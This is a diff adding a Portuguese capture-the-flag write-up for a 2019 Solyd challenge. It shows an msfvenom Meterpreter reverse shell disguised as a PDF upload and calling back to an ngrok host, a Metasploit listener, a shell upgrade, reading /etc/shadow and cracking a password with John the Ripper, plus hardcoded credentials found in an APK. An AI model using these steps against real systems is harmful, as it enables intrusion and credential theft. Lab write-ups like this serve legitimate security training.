@@ -522,3 +522,187 @@ Observação: também seria possível recuperar a flag usando:
 strings -n 1 license.bin
 
 E reconstruindo manualmente os caracteres.
+
+
+CTF 2019 – Solyd
+Desafio 3: Desenvolvimento GoHorsa
+Flag 1 – Upload malicioso e Reverse Shell
+
+A exploração iniciou com um scan utilizando Nmap para identificar serviços ativos e tentar descobrir o sistema operacional.
+
+Comando utilizado:
+
+nmap 13.220.23.173 -O
+
+Resultado:
+
+PORT     STATE    SERVICE
+25/tcp   filtered smtp
+8080/tcp open     http-proxy
+
+Foi identificado apenas um serviço web na porta 8080.
+
+Análise da aplicação web
+
+Ao acessar o site foram encontrados:
+
+página de registro
+
+página de login
+
+página de recrutamento
+
+Na página de recrutamento era possível enviar um currículo em PDF.
+
+Isso indicava uma possível vulnerabilidade de upload de arquivos.
+
+A estratégia foi enviar um arquivo malicioso disfarçado de PDF contendo uma reverse shell.
+
+Criação do payload
+
+Foi utilizado msfvenom para gerar um payload Linux.
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=0.tcp.sa.ngrok.io LPORT=14520 -f elf > shell.pdf
+
+Observação: o arquivo foi nomeado como PDF, mas na verdade é um executável ELF.
+
+Listener no Metasploit
+
+Foi iniciado um listener com Metasploit.
+
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 4444
+exploit
+
+Após o upload do arquivo malicioso na aplicação web, foi recebida uma conexão reversa.
+
+Resultado:
+
+Meterpreter session 1 opened
+Acesso ao sistema
+
+Foi obtido acesso ao shell:
+
+meterpreter > shell
+
+Listando arquivos:
+
+ls -la
+
+Resultado:
+
+reverse_2026-03-09_01_56
+reverse_2026-03-09_01_57
+reverse_2026-03-09_02_03
+reverse_2026-03-09_02_05
+
+Melhorando a shell:
+
+python -c "import pty; pty.spawn('/bin/bash')"
+
+Dentro da shell foi encontrada a primeira flag:
+
+Solyd{34sy_p34sy}
+Flag 2 – Quebra de hash
+
+Já dentro da máquina foi tentado acessar o arquivo:
+
+/etc/shadow
+
+Comando:
+
+cat /etc/shadow
+
+Foi possível visualizar as hashes dos usuários, incluindo:
+
+github:$6$hfGGddWa$...
+Identificação dos usuários
+
+Arquivo analisado:
+
+cat /etc/passwd
+
+Usuários relevantes:
+
+github:x:1000:1000:/home/github:/bin/bash
+exploited:x:1001:1001:/home/exploited:/bin/bash
+Preparação da hash
+
+Foi utilizado unshadow para preparar o arquivo de cracking.
+
+Depois foi isolada a hash do usuário github.
+
+Quebra da senha
+
+Foi utilizado John the Ripper com a wordlist rockyou.
+
+john hash.txt --wordlist=rockyou.txt
+
+Resultado:
+
+456456456 (github)
+
+Senha descoberta:
+
+456456456
+Escalada de usuário
+
+Dentro da shell:
+
+su github
+
+Senha:
+
+456456456
+
+Após o login, foi exibida a segunda flag:
+
+Solyd{Brut3_F0rc3_t0P}
+Flag 3 – Análise de APK
+
+Dentro da home do usuário github foi encontrado o diretório:
+
+insecure-apk
+
+Listagem:
+
+ls -la
+
+Resultado:
+
+drwxrwx--- insecure-apk
+
+Dentro do diretório havia:
+
+um arquivo README
+
+um arquivo APK
+
+Decompilação do APK
+
+O APK foi baixado e analisado utilizando um decompilador de APK online.
+
+Durante a análise do código fonte foi encontrado o seguinte trecho:
+
+public static final String[] DUMMY_CREDENTIALS = {
+    "admin@fake.com:D2xk5PRS112keUcL"
+};
+
+Ou seja, o aplicativo continha credenciais hardcoded.
+
+Credenciais encontradas:
+
+admin@fake.com
+D2xk5PRS112keUcL
+Login na aplicação
+
+Utilizando essas credenciais no site foi possível realizar login.
+
+Após o login, o sistema revelou a terceira flag:
+
+Solyd{J4v4_T0P}
+
+
+
